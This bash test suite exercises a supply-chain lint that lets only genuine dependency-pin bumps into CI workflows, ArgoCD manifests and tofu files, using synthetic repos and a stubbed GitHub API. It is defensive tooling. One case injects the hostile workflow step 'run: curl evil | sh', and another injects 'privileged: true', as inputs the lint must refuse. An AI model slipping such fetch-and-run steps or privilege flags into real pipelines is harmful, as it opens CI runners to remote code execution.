#!/usr/bin/env bash
# pin-only-lint-test — drives the REAL scripts/pin-only-lint.sh over synthetic git repos through
# its two seams (PIN_ONLY_REPO = the temp repo, PIN_ONLY_GH = a stub that serves canned GitHub
# API JSON through the real `--jq` expressions via jq). `devbox run pin-only-lint-test`.
#
# Every expected verdict below is derived in its comment FROM the rule in pin-only-lint.sh's
# header ((a) grammar, (b) pairing, (c) first-party, (d) upstream SHA) and the two older shapes'
# PIN_LINE — never from running the script. A failing case must fail for ITS rule: the check
# greps the script's stderr for the rule's own keyword, so a case that reds for the wrong reason
# is a FAIL here too.
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
LINT="$HERE/pin-only-lint.sh"
command -v jq >/dev/null || { echo "FAIL: jq not on PATH — run via \`devbox run pin-only-lint-test\`"; exit 1; }
T="$(mktemp -d)"; trap 'rm -rf "$T"' EXIT
export GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t
export PIN_ONLY_REPO="$T/repo" PIN_ONLY_GH="$T/gh-stub" STUB="$T/api" PIN_ONLY_SLUG="teststuffstash/synthetic"

# ── the gh stub: `gh api <path> --jq <expr>` → jq -r <expr> over $STUB/<path>; a missing file is
# the 404 shape (non-zero, message on stderr) — exactly what an unknown tag returns upstream.
cat >"$PIN_ONLY_GH" <<'EOF'
#!/usr/bin/env bash
[ "$1" = api ] && [ "$3" = --jq ] || { echo "stub: unexpected call: $*" >&2; exit 64; }
f="$STUB/$2"
[ -f "$f" ] || { echo "gh: HTTP 404: Not Found (https://api.github.com/$2)" >&2; exit 1; }
jq -r "$4" <"$f"
EOF
chmod +x "$PIN_ONLY_GH"
# ref_ <owner/repo> <tag> <type> <sha>: the git/ref/tags/<tag> object.  tagobj_ <owner/repo>
# <tagsha> <commitsha>: the annotated tag object git/tags/<tagsha> pointing at a commit.
ref_()    { mkdir -p "$STUB/repos/$1/git/ref/tags"; printf '{"ref":"refs/tags/%s","object":{"type":"%s","sha":"%s"}}\n' "$2" "$3" "$4" >"$STUB/repos/$1/git/ref/tags/$2"; }
tagobj_() { mkdir -p "$STUB/repos/$1/git/tags"; printf '{"tag":"x","sha":"%s","object":{"type":"commit","sha":"%s"}}\n' "$2" "$3" >"$STUB/repos/$1/git/tags/$2"; }
# reverts_ <owner/repo@sha …>: the closed-PR list with ONE merged revert-wf-* PR naming those pins
# (check (e)); reverts_ "" is the empty memory every case gets by default (see case_).
CLOSED='pulls?state=closed&sort=updated&direction=desc&per_page=100'
reverts_() { mkdir -p "$STUB/repos/$PIN_ONLY_SLUG"; if [ -z "$1" ]; then printf '[]\n'; else printf '[{"merged_at":"%s","head":{"ref":"revert-wf-abcd1234"},"body":"FU-1990 rollback\\n\\nreverted-pins: %s"}]\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$1"; fi >"$STUB/repos/$PIN_ONLY_SLUG/$CLOSED"; }
# reverts_img_ <image ref …>: the closed-PR list with ONE merged revert-img-* PR naming those
# image refs (check (f), the tofu-image-revert chain's memory).
# reverts_prov_ <name@version …>: ONE merged revert-prov-* PR naming those provider versions
# (check (g), the tofu-provider-revert chain's memory).
reverts_prov_() { mkdir -p "$STUB/repos/$PIN_ONLY_SLUG"; printf '[{"merged_at":"%s","head":{"ref":"revert-prov-abcd1234"},"body":"#1988 rollback\\n\\nreverted-providers: %s"}]\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$1" >"$STUB/repos/$PIN_ONLY_SLUG/$CLOSED"; }
reverts_img_() { mkdir -p "$STUB/repos/$PIN_ONLY_SLUG"; printf '[{"merged_at":"%s","head":{"ref":"revert-img-abcd1234"},"body":"#1988 rollback\\n\\nreverted-images: %s"}]\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$1" >"$STUB/repos/$PIN_ONLY_SLUG/$CLOSED"; }

# 40-hex SHAs with a readable first byte; the values only need to be distinct and well-formed.
OLD=1111111111111111111111111111111111111111
NEW=2222222222222222222222222222222222222222
OTHER=3333333333333333333333333333333333333333
TAGOBJ=4444444444444444444444444444444444444444
FP_OLD=5555555555555555555555555555555555555555
FP_NEW=6666666666666666666666666666666666666666

# ── the synthetic repo: one workflow with two pinned actions (checkout twice, buildx once), a
# first-party workflow, and the two older guarded files.
R="$T/repo"; mkdir -p "$R/.github/workflows" "$R/argocd/platform" "$R/agents/coordinator"
git -C "$R" init -q -b master
cat >"$R/.github/workflows/ci.yaml" <<EOF
name: CI
on: [pull_request]
jobs:
  ci:
    runs-on: homelab-ephemeral
    steps:
      - uses: actions/checkout@$OLD # v4.2.1
      - uses: docker/setup-buildx-action@$OLD # v3
      - name: again
        uses: actions/checkout@$OLD # v4.2.1
      - run: echo hi
EOF
cat >"$R/.github/workflows/first-party.yml" <<EOF
name: fp
on: [push]
jobs:
  x:
    runs-on: homelab-ephemeral
    steps:
      - uses: teststuffstash/some-action@$FP_OLD # v1
EOF
printf 'spec:\n  template:\n    spec:\n      image: ghcr.io/teststuffstash/homelab/arc-runner:2026.9.1-gaaaa\n' >"$R/argocd/platform/arc-runners.yaml"
printf 'spec:\n  source:\n    targetRevision: 2026.9.1-gaaaa\n    chart: x\n' >"$R/argocd/platform/openrouter-operator.yaml"
# the fourth shape's home: a tofu Deployment with the dind sidecar's image line (check (f)).
mkdir -p "$R/tofu"
# check (g)'s home: a lockfile with two providers (the version line alone does not say whose it is).
printf 'provider "registry.opentofu.org/hashicorp/kubernetes" {\n  version     = "2.38.0"\n  constraints = "~> 2.31"\n}\n\nprovider "registry.opentofu.org/hashicorp/helm" {\n  version = "3.0.2"\n}\n' >"$R/tofu/.terraform.lock.hcl"
printf 'resource "kubernetes_deployment" "x" {\n  spec {\n    template {\n      spec {\n        container {\n          name  = "dind"\n          image = "docker:27-dind"\n        }\n      }\n    }\n  }\n}\n' >"$R/tofu/x.tf"
git -C "$R" add -A && git -C "$R" commit -q -m base
BASE="$(git -C "$R" rev-parse HEAD)"

pass=0; fail=0
# case_ <name> <want: ok | <stderr keyword the failing rule prints>> <stub setup> <edit shell>
# The stub tree is rebuilt per case so a canned answer never leaks between cases.
case_() {
  local name="$1" want="$2" stubs="$3" edit="$4" out rc
  rm -rf "$STUB"; mkdir -p "$STUB"; reverts_ ""; eval "$stubs"
  git -C "$R" checkout -q -b "c-$name" "$BASE"
  ( cd "$R" && eval "$edit" ) >/dev/null 2>&1
  git -C "$R" add -A && git -C "$R" commit -q -m "$name"
  out="$(bash "$LINT" "$BASE" 2>&1)"; rc=$?
  git -C "$R" checkout -q master
  if [ "$want" = ok ]; then
    if [ $rc = 0 ] && printf '%s' "$out" | grep -q '^pin-only-lint: OK'; then pass=$((pass+1)); echo "PASS $name (rc 0)"; return; fi
    fail=$((fail+1)); echo "FAIL $name — wanted OK, rc=$rc:"; printf '%s\n' "$out" | sed 's/^/     /'; return
  fi
  if [ $rc != 0 ] && printf '%s' "$out" | grep -q 'pin-only-lint: FAIL' && printf '%s' "$out" | grep -qF -- "$want"; then
    pass=$((pass+1)); echo "PASS $name (rc $rc, fired on '$want')"; return
  fi
  fail=$((fail+1)); echo "FAIL $name — wanted a FAIL naming '$want', rc=$rc:"; printf '%s\n' "$out" | sed 's/^/     /'
}
# bump <file> <owner/repo> <old-sha> <old-tag> <new-sha> <new-tag>: rewrite every pin of that action
bump() { sed -i "s|uses: $2@$3 # $4\$|uses: $2@$5 # $6|" "$1"; }

# (a)+(b)+(d) all hold: both checkout lines move OLD→NEW at v4.2.2, the ref names NEW → OK.
case_ clean-pair-bump ok \
  "ref_ actions/checkout v4.2.2 commit $NEW" \
  "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2"
# (e) the reverted-pin memory: the same clean bump is REFUSED when a merged revert-wf-* PR of this
# repo names NEW as a reverted pin (the FU-1990 chain rolled it back) …
case_ reverted-pin-refused 'is a REVERTED pin' \
  "ref_ actions/checkout v4.2.2 commit $NEW; reverts_ actions/checkout@$NEW" \
  "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2"
# … and the memory is fail-closed: an unreadable closed-PR list is a FAIL, never a pass (d)'s rule.
case_ reverted-memory-unreadable 'cannot read the merged revert-wf-* PRs' \
  "ref_ actions/checkout v4.2.2 commit $NEW; rm -f \"\$STUB/repos/\$PIN_ONLY_SLUG/\$CLOSED\"" \
  "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2"
# A one-line bump on the v3 major tag (Renovate's digest-only shape): ref v3 → NEW → OK.
case_ clean-major-tag-bump ok \
  "ref_ docker/setup-buildx-action v3 commit $NEW" \
  "bump .github/workflows/ci.yaml docker/setup-buildx-action $OLD v3 $NEW v3"
# (a): `run:` is not a `uses:` pin line → the grammar rule fails the file; the upstream stub is
# never consulted (no ref_ set), so a pass here could only come from the grammar being loose.
case_ smuggled-run-line 'added lines must be pinned' "" \
  "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2; sed -i 's|run: echo hi|run: curl evil \| sh|' .github/workflows/ci.yaml"
# (a): a new step whose pin is well-formed and even resolves upstream is still an ADDED line with
# no removed partner → (b) fails (multiset removed ≠ added), before (d) is consulted.
case_ added-step 'do not pair up' \
  "ref_ actions/cache v4 commit $NEW" \
  "sed -i 's|      - run: echo hi|      - uses: actions/cache@$NEW # v4\n      - run: echo hi|' .github/workflows/ci.yaml"
# (b): removed actions/checkout, added actions/cache — the sets differ → pairing fails.
case_ owner-repo-mismatch 'do not pair up' \
  "ref_ actions/cache v4 commit $NEW" \
  "sed -i 's|uses: actions/checkout@$OLD # v4.2.1|uses: actions/cache@$NEW # v4|' .github/workflows/ci.yaml"
# (c): a first-party ref bump that would satisfy (a), (b) and (d) (the stub resolves it) is
# refused solely on the owner → the first-party rule's own message.
case_ first-party-ref-change 'first-party ref never changes' \
  "ref_ teststuffstash/some-action v1 commit $FP_NEW" \
  "bump .github/workflows/first-party.yml teststuffstash/some-action $FP_OLD v1 $FP_NEW v1"
# (d): the tag names OTHER upstream, the PR pins NEW → mismatch message carries both SHAs.
case_ tag-names-other-sha "names commit $OTHER upstream, the PR pins $NEW" \
  "ref_ actions/checkout v4.2.2 commit $OTHER" \
  "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2"
# (d) fail-closed: no stub file → the 404 shape → 'refusing to report success', rc 2.
case_ unresolvable-tag 'refusing to report success' "" \
  "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2"
# (d) annotated: ref v4.2.2 is a TAG object TAGOBJ; git/tags/TAGOBJ points at commit NEW → OK.
case_ annotated-tag-deref ok \
  "ref_ actions/checkout v4.2.2 tag $TAGOBJ; tagobj_ actions/checkout $TAGOBJ $NEW" \
  "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2"
# (d) annotated, pointing elsewhere: the tag object names OTHER, the PR pins NEW → mismatch.
case_ annotated-tag-other-sha "names commit $OTHER upstream, the PR pins $NEW" \
  "ref_ actions/checkout v4.2.2 tag $TAGOBJ; tagobj_ actions/checkout $TAGOBJ $OTHER" \
  "bump .github/workflows/ci.yaml actions/checkout $OLD v4.2.1 $NEW v4.2.2"
# (a): an unpinned `@v4` in place of a pin is not the ADDED grammar → FAIL (a de-pin is blocked).
case_ unpinned-tag-ref 'added lines must be pinned' "" \
  "sed -i 's|uses: actions/checkout@$OLD # v4.2.1|uses: actions/checkout@v4|' .github/workflows/ci.yaml"
# A mode flip (chmod +x) carries no content lines → not a pin bump → FAIL (the empty-patch arm).
case_ workflow-mode-change 'without a single content line' "" \
  "chmod +x .github/workflows/ci.yaml"
# A rename: `git diff -- <new path>` on a detected rename shows the WHOLE body as added, so the
# non-`uses:` lines (name:, on:, run:) fail the grammar → FAIL on (a). Either arm is fail-closed.
case_ workflow-rename 'added lines must be pinned' "" \
  "git mv .github/workflows/ci.yaml .github/workflows/ci2.yaml"
# ── the two older shapes, byte-for-byte: PIN_LINE admits an arc-runner image: line and a CalVer
# targetRevision: line, refuses anything else in those files.
case_ arc-runner-pin ok "" \
  "sed -i 's|arc-runner:2026.9.1-gaaaa|arc-runner:2026.9.25-gbbbb|' argocd/platform/arc-runners.yaml"
case_ arc-runner-smuggled 'may only receive PIN lines' "" \
  "sed -i 's|arc-runner:2026.9.1-gaaaa|arc-runner:2026.9.25-gbbbb|' argocd/platform/arc-runners.yaml; echo '      privileged: true' >> argocd/platform/arc-runners.yaml"
case_ target-revision-pin ok "" \
  "sed -i 's|targetRevision: 2026.9.1-gaaaa|targetRevision: 2026.9.25-gbbbb|' argocd/platform/openrouter-operator.yaml"
case_ target-revision-smuggled 'may only receive PIN lines' "" \
  "sed -i 's|targetRevision: 2026.9.1-gaaaa|targetRevision: 2026.9.25-gbbbb|; s|chart: x|chart: y|' argocd/platform/openrouter-operator.yaml"
# An untouched guarded set is the no-op verdict (the common case on every PR).
case_ nothing-guarded ok "" "echo x > README.md"

# (f) the reverted-image memory — tofu/*.tf is not guarded (a non-image edit never reads the
# memory), an image bump passes on an empty memory, is REFUSED when a merged revert-img-* PR
# names the new ref, and the check fails closed when the memory cannot be read.
case_ tofu-non-image-edit ok "rm -f \"\$STUB/repos/\$PIN_ONLY_SLUG/\$CLOSED\"" "printf '# comment\\n' >> tofu/x.tf"
case_ tofu-image-bump ok "" "sed -i 's/docker:27-dind/docker:29-dind/' tofu/x.tf"
case_ tofu-image-reverted-refused 'is a REVERTED image' "reverts_img_ docker:29-dind" \
  "sed -i 's/docker:27-dind/docker:29-dind/' tofu/x.tf"
case_ tofu-image-other-reverted ok "reverts_img_ docker:28-dind" \
  "sed -i 's/docker:27-dind/docker:29-dind/' tofu/x.tf"
case_ tofu-image-memory-unreadable 'cannot read the merged revert-img-* PRs' "rm -f \"\$STUB/repos/\$PIN_ONLY_SLUG/\$CLOSED\"" \
  "sed -i 's/docker:27-dind/docker:29-dind/' tofu/x.tf"
# (g) the reverted-provider memory: a lockfile bump passes on an empty memory, is REFUSED when a
# merged revert-prov-* PR names that provider@version, passes when the memory names ANOTHER
# provider at the same version (the name is part of the key), and an unreadable memory is a FAIL.
case_ provider-bump ok "" "sed -i 's/2.38.0/3.2.1/' tofu/.terraform.lock.hcl"
case_ provider-reverted-refused 'is a REVERTED provider version' "reverts_prov_ kubernetes@3.2.1" \
  "sed -i 's/2.38.0/3.2.1/' tofu/.terraform.lock.hcl"
case_ provider-other-name-same-version ok "reverts_prov_ helm@3.2.1" \
  "sed -i 's/2.38.0/3.2.1/' tofu/.terraform.lock.hcl"
case_ provider-memory-unreadable 'cannot read the merged revert-prov-* PRs' "rm -f \"\$STUB/repos/\$PIN_ONLY_SLUG/\$CLOSED\"" \
  "sed -i 's/2.38.0/3.2.1/' tofu/.terraform.lock.hcl"

# ── the initial-pin scenario: a repo whose workflows were NEVER pinned before. Renovate's first
# pass removes unpinned refs (`@v4`) and adds pinned ones (`@sha # v4`). The removed lines are
# unpinned (don't match WORKFLOW_PIN_LINE), the added lines are pinned. Pairing still holds.
R2="$T/repo2"; mkdir -p "$R2/.github/workflows"
git -C "$R2" init -q -b master
cat >"$R2/.github/workflows/ci.yaml" <<EOF
name: CI
on: [pull_request]
jobs:
  ci:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-buildx-action@v3
      - run: echo hi
EOF
git -C "$R2" add -A && git -C "$R2" commit -q -m base
BASE2="$(git -C "$R2" rev-parse HEAD)"

# Initial pin: unpinned → pinned. Removed lines are unpinned, added are pinned with verified SHAs.
git -C "$R2" checkout -q -b "initial-pin" "$BASE2"
sed -i "s|uses: actions/checkout@v4|uses: actions/checkout@$NEW # v4|" "$R2/.github/workflows/ci.yaml"
sed -i "s|uses: docker/setup-buildx-action@v3|uses: docker/setup-buildx-action@$NEW # v3|" "$R2/.github/workflows/ci.yaml"
git -C "$R2" add -A && git -C "$R2" commit -q -m "pin deps"
rm -rf "$STUB"; mkdir -p "$STUB"; reverts_ ""
ref_ actions/checkout v4 commit $NEW
ref_ docker/setup-buildx-action v3 commit $NEW
out="$(PIN_ONLY_REPO="$R2" PIN_ONLY_GH="$PIN_ONLY_GH" bash "$LINT" "$BASE2" 2>&1)"; rc=$?
if [ $rc = 0 ] && printf '%s' "$out" | grep -q '^pin-only-lint: OK'; then
  pass=$((pass+1)); echo "PASS initial-pin-unpinned-to-pinned (rc 0)"
else
  fail=$((fail+1)); echo "FAIL initial-pin-unpinned-to-pinned — wanted OK, rc=$rc:"; printf '%s\n' "$out" | sed 's/^/     /'
fi
git -C "$R2" checkout -q master

# Initial pin with a mismatched owner/repo (removed actions/checkout, added actions/cache) → FAIL.
git -C "$R2" checkout -q -b "initial-pin-mismatch" "$BASE2"
sed -i "s|uses: actions/checkout@v4|uses: actions/cache@$NEW # v4|" "$R2/.github/workflows/ci.yaml"
git -C "$R2" add -A && git -C "$R2" commit -q -m "pin mismatch"
rm -rf "$STUB"; mkdir -p "$STUB"; reverts_ ""
ref_ actions/cache v4 commit $NEW
out="$(PIN_ONLY_REPO="$R2" PIN_ONLY_GH="$PIN_ONLY_GH" bash "$LINT" "$BASE2" 2>&1)"; rc=$?
if [ $rc != 0 ] && printf '%s' "$out" | grep -q 'do not pair up'; then
  pass=$((pass+1)); echo "PASS initial-pin-owner-mismatch (rc $rc, fired on 'do not pair up')"
else
  fail=$((fail+1)); echo "FAIL initial-pin-owner-mismatch — wanted 'do not pair up', rc=$rc:"; printf '%s\n' "$out" | sed 's/^/     /'
fi
git -C "$R2" checkout -q master

echo "pin-only-lint-test: $pass passed, $fail failed"
[ "$fail" = 0 ]
